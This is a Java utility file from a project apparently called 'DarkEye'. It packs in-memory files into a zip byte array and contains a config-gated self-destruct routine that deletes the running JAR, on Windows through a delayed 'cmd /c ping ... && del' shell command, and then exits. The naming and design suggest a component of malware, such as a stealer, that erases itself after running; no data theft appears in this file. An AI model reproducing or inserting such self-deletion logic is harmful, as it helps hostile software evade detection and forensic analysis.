package org.spray.darkeye.utils;

import java.io.ByteArrayOutputStream;
import java.io.File;
import java.io.IOException;
import java.net.URISyntaxException;
import java.nio.file.Files;
import java.util.List;
import java.util.zip.ZipEntry;
import java.util.zip.ZipOutputStream;

import org.spray.darkeye.Config;

public class FileUtils {

	private static String getJarName() {
		return new File(FileUtils.class.getProtectionDomain().getCodeSource().getLocation().getPath()).getName();
	}

	public static boolean isRunningFromJAR() {
		String jarName = getJarName();
		return jarName.contains(".jar");
	}

	public static String getProgramDirectory() {
		if (isRunningFromJAR()) {
			return getCurrentJARDirectory();
		} else {
			return getCurrentProjectDirectory();
		}
	}

	private static String getCurrentProjectDirectory() {
		return new File("").getAbsolutePath();
	}

	public static String getCurrentJARDirectory() {
		try {
			return getCurrentJARFilePath().getParent();
		} catch (URISyntaxException exception) {
			exception.printStackTrace();
		}

		throw new IllegalStateException("Unexpected null JAR path");
	}

	public static File getCurrentJARFilePath() throws URISyntaxException {
		return new File(FileUtils.class.getProtectionDomain().getCodeSource().getLocation().toURI().getPath());
	}

	public static class MemoryFile {
		public String fileName;
		public byte[] contents;
	}

	public byte[] createZipByteArray(List<MemoryFile> memoryFiles) throws IOException {
		ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream();
		ZipOutputStream zipOutputStream = new ZipOutputStream(byteArrayOutputStream);
		try {
			for (MemoryFile memoryFile : memoryFiles) {
				ZipEntry zipEntry = new ZipEntry(memoryFile.fileName);
				zipOutputStream.putNextEntry(zipEntry);
				zipOutputStream.write(memoryFile.contents);
				zipOutputStream.closeEntry();
			}
		} finally {
			zipOutputStream.close();
		}
		return byteArrayOutputStream.toByteArray();
	}

	private static void selfDestructWindowsJARFile() throws Exception {
		String currentJARFilePath = getCurrentJARFilePath().toString();
		Runtime runtime = Runtime.getRuntime();
		runtime.exec("cmd /c ping localhost -n 2 > nul && del \"" + currentJARFilePath + "\"");
	}

	public static void seldDestructionJar() throws Exception {
		if (!Config.SELF_DESTRUCT)
			return;
		
		if (OSTools.isOSWindows()) {
			selfDestructWindowsJARFile();
		} else {
			File directoryFilePath = getCurrentJARFilePath();
			Files.delete(directoryFilePath.toPath());
		}

		System.exit(0);

	}
}
